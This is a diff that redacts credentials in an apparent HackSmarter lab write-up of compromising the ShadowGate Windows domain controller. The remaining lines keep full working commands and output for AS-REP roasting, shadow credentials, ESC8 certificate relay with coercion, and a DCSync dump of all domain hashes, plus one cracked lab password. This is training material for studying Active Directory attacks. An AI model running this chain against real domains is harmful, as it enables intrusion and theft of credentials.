@@ -25,7 +25,7 @@ The assessment will evaluate whether a motivated attacker with standard network 
 The Hack Smarter team has been authorized to perform a black box internal penetration test against the ShadowGate environment.
 
 **Platform:** HackSmarter
-**Difficulty:** Hard
+**Difficulty:** Easy
 **OS:** Windows Server 2022
 **IP:** `10.1.83.236`
 **Hostname:** `DC01.shadow.gate`
@@ -196,7 +196,7 @@ nxc ldap 10.1.83.236 -u 'users.txt' -p '' --asreproast results.txt
 
 ```
 LDAP        10.1.83.236     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never)
-LDAP        10.1.83.236     389    DC01             $krb5asrep$23$jtrueblood@SHADOW.GATE:dee85896b8dcd010d8869ab759d4e8db$587db1f1ef95b889b66f0c484853966550478a2286e992ff1d5b84b1ddbbfa7df4dce4ffd774802b27209223d9a4fbb440f14c51d8fbfecc61dca1898dff2834d0033828062492e451df5ccd92bc347eb779c79e3f039634b410e24bcf0463d8d4ef10482457312a2024d0f9bf2d2c9e91ef3e193b564ad1f013aadc2a57a6c87339b906add890643647f230fdc53c493a904a521f85b91d8badee45d3d54355ae130b16bc3fbcbc433892b77d54661435af252ba094fd2ebd70405d485f4225e510b4a52f8a2e3ef5e051a40291472ec70b9372d460332823cf991f96ee51622ec4044d62e91a90f4fb
+LDAP        10.1.83.236     389    DC01             $krb5asrep$23$jtrueblood@SHADOW.GATE:<redacted>
 ```
 
 ## Cracking the Hash
@@ -208,7 +208,7 @@ hashcat -m 18200 jtrueblood /usr/share/wordlists/rockyou.txt
 ```
 
 ```
-$krb5asrep$23$jtrueblood@SHADOW.GATE:...:blood_brothers
+$krb5asrep$23$jtrueblood@SHADOW.GATE:<redacted>:blood_brothers
 ```
 
 **Credentials:** `jtrueblood` : `blood_brothers`
@@ -282,33 +282,33 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'bbrown'
 [*] Restoring the old Key Credentials for 'bbrown'
 [*] Successfully restored the old Key Credentials for 'bbrown'
-[*] NT hash for 'bbrown': 259745cb123a52aa2e693aaacca2db52
+[*] NT hash for 'bbrown': <redacted>
 ```
 
 Verify the hash works:
 
 ```bash
-nxc smb 10.1.83.236 -u 'bbrown' -H '259745cb123a52aa2e693aaacca2db52'
+nxc smb 10.1.83.236 -u 'bbrown' -H '<redacted>'
 ```
 
 ```
 SMB         10.1.83.236     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
-SMB         10.1.83.236     445    DC01             [+] shadow.gate\bbrown:259745cb123a52aa2e693aaacca2db52
+SMB         10.1.83.236     445    DC01             [+] shadow.gate\bbrown:<redacted>
 ```
 
-**Credentials:** `bbrown` : `259745cb123a52aa2e693aaacca2db52` (NT hash)
+**Credentials:** `bbrown` : `<redacted>` (NT hash)
 
 ## Share Enumeration
 
 As `bbrown`, enumerate accessible SMB shares. The presence of a readable `CertEnroll` share is a strong indicator that ADCS web enrollment is exposed and worth investigating.
 
 ```bash
-nxc smb 10.1.83.236 -u 'bbrown' -H '259745cb123a52aa2e693aaacca2db52' --shares
+nxc smb 10.1.83.236 -u 'bbrown' -H '<redacted>' --shares
 ```
 
 ```
 SMB         10.1.83.236     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
-SMB         10.1.83.236     445    DC01             [+] shadow.gate\bbrown:259745cb123a52aa2e693aaacca2db52
+SMB         10.1.83.236     445    DC01             [+] shadow.gate\bbrown:<redacted>
 SMB         10.1.83.236     445    DC01             [*] Enumerated shares
 SMB         10.1.83.236     445    DC01             Share           Permissions     Remark
 SMB         10.1.83.236     445    DC01             -----           -----------     ------
@@ -325,7 +325,7 @@ SMB         10.1.83.236     445    DC01             SYSVOL          READ        
 `spider_plus` recursively lists and catalogs all files across accessible shares. Finding the CA certificate and CRL in `CertEnroll` confirms an active ADCS deployment — enough to justify running `certipy find` for vulnerability enumeration.
 
 ```bash
-nxc smb 10.1.83.236 -u 'bbrown' -H '259745cb123a52aa2e693aaacca2db52' -M spider_plus
+nxc smb 10.1.83.236 -u 'bbrown' -H '<redacted>' -M spider_plus
 ```
 
 ```
@@ -356,7 +356,7 @@ SPIDER_PLUS 10.1.83.236     445    DC01             [+] Saved share-file metadat
 Query LDAP for the ADCS Certificate Authority name and enrollment server — needed to target certipy. This confirms the CA is `shadow-DC01-CA` running on `DC01.shadow.gate`.
 
 ```bash
-nxc ldap 10.1.83.236 -u 'bbrown' -H '259745cb123a52aa2e693aaacca2db52' -M adcs
+nxc ldap 10.1.83.236 -u 'bbrown' -H '<redacted>' -M adcs
 ```
 
 ```
@@ -368,7 +368,7 @@ ADCS        10.1.83.236     389    DC01             Found CN: shadow-DC01-CA
 The nmap scan already flagged `Message signing enabled but not required` on SMB, and certipy confirms the web enrollment endpoint only supports HTTP — no HTTPS. These two conditions make ESC8 viable: we can coerce the DC to authenticate to us over SMB, relay that NTLM authentication to the unprotected HTTP enrollment endpoint, and request a certificate on behalf of the DC machine account.
 
 ```bash
-certipy find -dc-ip 10.1.83.236 -u 'bbrown@shadow.gate' -hashes ':259745cb123a52aa2e693aaacca2db52' -vulnerable -stdout
+certipy find -dc-ip 10.1.83.236 -u 'bbrown@shadow.gate' -hashes ':<redacted>' -vulnerable -stdout
 ```
 
 ```
@@ -407,7 +407,7 @@ certipy relay -target http://10.1.83.236/certsrv/ -ca 'shadow-DC01-CA' -template
 In a second terminal, use coercer to force DC01 to authenticate to our machine via MS-EFSR (EFS RPC). The DC's machine account NTLM auth is relayed to `/certsrv/` and a certificate is issued for DC01$.
 
 ```bash
-coercer coerce -l 10.200.55.198 -t 10.1.83.236 -u bbrown --hashes ':259745cb123a52aa2e693aaacca2db52' -d shadow.gate
+coercer coerce -l 10.200.55.198 -t 10.1.83.236 -u bbrown --hashes ':<redacted>' -d shadow.gate
 ```
 
 ```
@@ -455,10 +455,10 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Got TGT
 [*] Saving credential cache to 'dc01.ccache'
 [*] Trying to retrieve NT hash for 'dc01$'
-[*] Got hash for 'dc01$@shadow.gate': aad3b435b51404eeaad3b435b51404ee:57867e655d1abc9f45fd6e954e351531
+[*] Got hash for 'dc01$@shadow.gate': <redacted>
 ```
 
-**Credentials:** `dc01$` : `57867e655d1abc9f45fd6e954e351531` (NT hash)
+**Credentials:** `dc01$` : `<redacted>` (NT hash)
 
 ---
 
@@ -467,7 +467,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 With DC01$'s NT hash we can DCSync the entire domain using the DRSUAPI replication protocol. Domain controllers have replication rights by design — no additional privilege escalation needed.
 
 ```bash
-secretsdump.py 'shadow.gate/dc01$@10.1.83.236' -hashes ':57867e655d1abc9f45fd6e954e351531'
+secretsdump.py 'shadow.gate/dc01$@10.1.83.236' -hashes ':<redacted>'
 ```
 
 ```
@@ -475,34 +475,34 @@ Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra,
 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b5509cbfe52e94940c0ec99b21e09802:::
-shadow.gate\ATHENA:1103:aad3b435b51404eeaad3b435b51404ee:3215f4c7c852647c88694ab0b57daaba:::
-shadow.gate\mbrownlee:1104:aad3b435b51404eeaad3b435b51404ee:6f16868319543175e7f3e6d4eea9adfb:::
-shadow.gate\bbrown:1109:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::
-shadow.gate\jtrueblood:1110:aad3b435b51404eeaad3b435b51404ee:27e133a345b980d24e3a60f169f2cb7e:::
-shadow.gate\jsmith:1112:aad3b435b51404eeaad3b435b51404ee:be0b6d125a6645747d91d30ed3bef98f:::
-shadow.gate\clocke:1113:aad3b435b51404eeaad3b435b51404ee:ff506444e2c59b0241812e8e17b0f05e:::
-shadow.gate\tclarke:1114:aad3b435b51404eeaad3b435b51404ee:9290a555713c7db0cf7fbf0ac28c1100:::
-shadow.gate\jbradford:1115:aad3b435b51404eeaad3b435b51404ee:f5c86043de2a116c6458f3de9aad89de:::
-shadow.gate\amoss:1116:aad3b435b51404eeaad3b435b51404ee:381480af4a988ad46758c2f79ee64090:::
-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:57867e655d1abc9f45fd6e954e351531:::
+Administrator:500:<redacted>:<redacted>:::
+Guest:501:<redacted>:<redacted>:::
+krbtgt:502:<redacted>:<redacted>:::
+shadow.gate\ATHENA:1103:<redacted>:<redacted>:::
+shadow.gate\mbrownlee:1104:<redacted>:<redacted>:::
+shadow.gate\bbrown:1109:<redacted>:<redacted>:::
+shadow.gate\jtrueblood:1110:<redacted>:<redacted>:::
+shadow.gate\jsmith:1112:<redacted>:<redacted>:::
+shadow.gate\clocke:1113:<redacted>:<redacted>:::
+shadow.gate\tclarke:1114:<redacted>:<redacted>:::
+shadow.gate\jbradford:1115:<redacted>:<redacted>:::
+shadow.gate\amoss:1116:<redacted>:<redacted>:::
+DC01$:1000:<redacted>:<redacted>:::
 [*] Kerberos keys grabbed
-Administrator:aes256-cts-hmac-sha1-96:6bf0048464b8fdf7a2db10f4799715a0c6471ac724424007e95bf55cd6841445
-krbtgt:aes256-cts-hmac-sha1-96:9d2c8f2fecd0d6813cde513680b594210cf9c91bc2d4f6715ce25972b6a7c7c5
+Administrator:aes256-cts-hmac-sha1-96:<redacted>
+krbtgt:aes256-cts-hmac-sha1-96:<redacted>
 [*] Cleaning up...
 ```
 
 Domain fully compromised. Verify Administrator access:
 
 ```bash
-nxc smb 10.1.83.236 -u Administrator -H '4366ec0f86e29be2a4a5e87a1ba922ec'
+nxc smb 10.1.83.236 -u Administrator -H '<redacted>'
 ```
 
 ```
 SMB         10.1.83.236     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
-SMB         10.1.83.236     445    DC01             [+] shadow.gate\Administrator:4366ec0f86e29be2a4a5e87a1ba922ec (Pwn3d!)
+SMB         10.1.83.236     445    DC01             [+] shadow.gate\Administrator:<redacted> (Pwn3d!)
 ```
 
 ---
@@ -516,12 +516,12 @@ jtrueblood      : blood_brothers              → AS-REP Roast + Hashcat
 
 Phase 2 - Lateral Movement
 ────────────────────────────────────────────────────────────────
-bbrown          : 259745cb123a52aa2e693aaacca2db52  → Shadow Credentials (GenericWrite)
+bbrown          : <redacted>  → Shadow Credentials (GenericWrite)
 
 Phase 3 - Domain Compromise
 ────────────────────────────────────────────────────────────────
-dc01$           : 57867e655d1abc9f45fd6e954e351531  → ESC8 Relay + PKINIT (UnPAC-the-hash)
-Administrator   : 4366ec0f86e29be2a4a5e87a1ba922ec  → DCSync
+dc01$           : <redacted>  → ESC8 Relay + PKINIT (UnPAC-the-hash)
+Administrator   : <redacted>  → DCSync
 ```
 
 ---
